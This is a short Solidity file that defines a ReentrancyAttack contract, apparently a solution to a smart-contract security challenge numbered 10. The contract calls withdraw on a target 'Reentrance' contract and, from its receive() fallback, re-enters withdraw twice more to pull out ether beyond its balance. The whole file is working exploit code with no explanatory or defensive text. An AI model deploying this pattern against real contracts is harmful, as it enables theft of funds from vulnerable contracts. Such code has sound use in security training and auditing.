// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;
import "./10_Reentrancy.sol";

contract ReentrancyAttack {
    uint256 public reentrancyCount = 2;
    Reentrance public target;

    constructor(Reentrance _target) public {
        target = _target;
    }

    function attack() external {
        target.withdraw(0.0005 ether);
    }

    receive() external payable {
        if (reentrancyCount > 0) {
            reentrancyCount--;
            target.withdraw(0.0005 ether);
        }
    }
}
